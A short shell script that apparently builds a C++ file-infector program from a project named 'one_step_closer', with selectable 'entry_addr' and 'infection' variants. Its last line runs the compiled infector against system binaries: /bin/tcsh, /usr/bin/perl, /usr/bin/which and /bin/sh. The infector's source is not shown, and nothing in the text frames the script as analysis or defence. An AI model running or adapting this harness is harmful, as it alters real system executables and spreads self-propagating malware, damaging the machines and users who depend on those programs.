#!/bin/sh 
project=${1:-one_step_closer}
entry_addr=${2:-e1}
infection=${3:-i1}

g++ -Wall -O2 -g \
	-I src/one_step_closer/${entry_addr} \
	-I ${OUT}/${project}/${infection} \
	-o ${TMP}/${project}/${entry_addr}${infection}/infector \
	src/${project}/*.cxx \
&& cd ${TMP}/${project}/${entry_addr}${infection} \
&& ./infector /bin/tcsh /usr/bin/perl /usr/bin/which /bin/sh
